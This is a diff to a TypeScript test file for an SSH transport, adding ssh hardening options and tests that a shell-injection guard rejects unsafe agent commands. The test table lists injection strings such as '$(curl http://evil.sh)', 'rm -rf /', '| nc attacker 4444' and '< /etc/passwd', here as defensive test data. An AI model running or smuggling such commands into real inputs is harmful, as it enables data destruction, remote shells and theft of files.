@@ -8,9 +8,12 @@
 import { spawn } from 'node:child_process';
 import { describe, expect, it } from 'vitest';
 import {
+  MachineAgentCommandError,
+  REMOTE_DAEMON_SOCKET_PATH,
   buildSshCommand,
   parseSshExit,
   spawnSshTransport,
+  splitAgentCommand,
   type SshCommandFactory,
 } from '../../src/main/machines/ssh-transport';
 import type { LocalMachineRecord, RemoteMachineRecord } from '../../src/shared/types/machine';
@@ -69,13 +72,23 @@ describe('buildSshCommand', () => {
       'StrictHostKeyChecking=yes',
       '-o',
       'UserKnownHostsFile=/home/u/.orchid/machines/build-1/known_hosts',
+      // The per-machine pin file is the only trust source.
+      '-o',
+      'GlobalKnownHostsFile=none',
       '-o',
       'ConnectTimeout=10',
+      // Half-open connection detection (NAT-dropped bridges must not hang).
+      '-o',
+      'ServerAliveInterval=15',
+      '-o',
+      'ServerAliveCountMax=3',
       'build.example.com',
       '--',
       'orchid-agent',
       'bridge',
+      REMOTE_DAEMON_SOCKET_PATH,
     ]);
+    expect(REMOTE_DAEMON_SOCKET_PATH).toBe('~/.orchid/daemon.sock');
   });
 
   it('adds the port flag and user prefix for non-default values', () => {
@@ -89,12 +102,17 @@ describe('buildSshCommand', () => {
     expect(argv).not.toContain('build.example.com');
   });
 
-  it('shell-splits a multi-token agentCommand and appends bridge last', () => {
+  it('shell-splits a multi-token agentCommand and appends bridge + socket path last', () => {
     const argv = buildSshCommand(
-      sshMachine({ agentCommand: `'/opt/orchid agent/orchid-agent' --verbose` }),
+      sshMachine({ agentCommand: '~/.local/bin/orchid-agent --verbose' }),
       '/kh',
     );
-    expect(argv.slice(-3)).toEqual(['/opt/orchid agent/orchid-agent', '--verbose', 'bridge']);
+    expect(argv.slice(-4)).toEqual([
+      '~/.local/bin/orchid-agent',
+      '--verbose',
+      'bridge',
+      REMOTE_DAEMON_SOCKET_PATH,
+    ]);
   });
 
   it('rejects the implicit local machine and an empty agent command', () => {
@@ -104,6 +122,72 @@ describe('buildSshCommand', () => {
     );
   });
 });
+
+// ── splitAgentCommand (injection guard) ──────────────────────────────────────
+
+describe('splitAgentCommand metacharacter guard', () => {
+  /**
+   * ssh re-joins everything after `--` with spaces and hands it to the remote
+   * login shell, so none of these may survive parsing as plain tokens.
+   */
+  const injections: Array<[string, RegExp]> = [
+    // Backticks survive shell-quote as plain tokens — the original bug.
+    ['orchid-agent `id`', /`/],
+    ['x`id`z', /`/],
+    // Command substitution parses into a `$` token plus paren operators.
+    ['orchid-agent $(id)', /\$/],
+    ['orchid-agent $(curl http://evil.sh)', /unknown|\$/],
+    // Quoting cannot smuggle spaces (or semicolons) past the guard.
+    ["orchid-agent 'foo bar'", / /],
+    ['orchid-agent "foo bar"', / /],
+    ["orchid-agent 'x; rm -rf /'", /;/],
+    // Operator sequences are shell syntax, never literal tokens.
+    ['orchid-agent; rm -rf /', /;/],
+    ['orchid-agent | nc attacker 4444', /\|/],
+    ['orchid-agent > /tmp/pwned', />/],
+    ['orchid-agent < /etc/passwd', /</],
+    ['orchid-agent & spinner', /&/],
+    ['orchid-agent && other', /&/],
+    ['orchid-agent || other', /\|/],
+    ['orchid-agent (subshell)', /\(/],
+    // Backslash escapes turn into literal whitespace/metachars in the token.
+    ['orchid-agent \\; -x', /;/],
+    // Glob wildcards parse as operator nodes.
+    ['orchid-agent *', /\*/],
+    // Shell comments are syntax nodes, not tokens.
+    ['orchid-agent # injected comment', /#/],
+  ];
+
+  for (const [command, invalidChar] of injections) {
+    it(`rejects ${JSON.stringify(command)} with a typed error naming the metacharacter`, () => {
+      const rejection = splitAgentCommandSafe(command);
+      expect(rejection).toBeInstanceOf(MachineAgentCommandError);
+      expect(rejection?.name).toBe('MachineAgentCommandError');
+      expect(rejection?.message).toContain('agentCommand');
+      expect(rejection?.message).toMatch(invalidChar);
+    });
+  }
+
+  it('accepts plain single- and multi-token commands', () => {
+    expect(splitAgentCommand('orchid-agent')).toEqual(['orchid-agent']);
+    expect(splitAgentCommand('orchid-agent --foo bar')).toEqual(['orchid-agent', '--foo', 'bar']);
+    expect(splitAgentCommand('~/.local/bin/orchid-agent --verbose')).toEqual([
+      '~/.local/bin/orchid-agent',
+      '--verbose',
+    ]);
+    expect(splitAgentCommand('/usr/local/bin/orchid-agent')).toEqual(['/usr/local/bin/orchid-agent']);
+  });
+});
+
+/** Capture a typed rejection without letting it escape the assertion helper. */
+function splitAgentCommandSafe(command: string): MachineAgentCommandError | undefined {
+  try {
+    splitAgentCommand(command);
+    return undefined;
+  } catch (error) {
+    return error instanceof MachineAgentCommandError ? error : undefined;
+  }
+}
 
 // ── parseSshExit ─────────────────────────────────────────────────────────────
 
